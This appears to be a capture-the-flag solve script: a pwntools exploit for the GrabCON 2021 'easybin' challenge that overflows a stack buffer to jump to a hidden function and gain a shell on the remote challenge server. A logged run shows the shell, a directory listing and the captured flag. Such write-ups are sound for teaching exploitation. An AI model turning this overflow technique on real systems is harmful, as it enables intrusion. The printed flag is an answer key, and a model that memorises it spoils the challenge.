@@ -1,0 +1,44 @@
+from pwn import *
+
+#context(os='linux', arch='amd64')
+#context.log_level = 'debug'
+
+BINARY = './easybin'
+elf  = ELF(BINARY)
+
+if len(sys.argv) > 1 and sys.argv[1] == 'r':
+  HOST = "35.246.38.194"
+  PORT = 31337
+  s = remote(HOST, PORT)
+else:
+  s = process(BINARY)
+
+buf  = "A"*56
+buf += p64(elf.sym.vuln)
+s.sendline(buf)
+
+s.interactive()
+
+'''
+mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Easybin$ python solve.py r
+[*] '/home/mito/CTF/GrabCON_CTF_2021/Pwn_Easybin/easybin'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+[+] Opening connection to 35.246.38.194 on port 31337: Done
+[*] Switching to interactive mode
+$ ls -l
+total 40
+drwxr-x--- 1 0 1000  4096 Sep  4 23:39 bin
+drwxr-x--- 1 0 1000  4096 Sep  4 23:39 dev
+-rwxr-x--- 1 0 1000 16248 Sep  4 23:38 easybin
+-rwxr----- 1 0 1000    33 Sep  4 23:38 flag.txt
+drwxr-x--- 1 0 1000  4096 Sep  4 23:39 lib
+drwxr-x--- 1 0 1000  4096 Sep  4 23:39 lib32
+drwxr-x--- 1 0 1000  4096 Sep  4 23:39 lib64
+$ cat flag.txt
+GrabCON{w3ll_Y0u_Kn0w_Basics!!!}
+'''
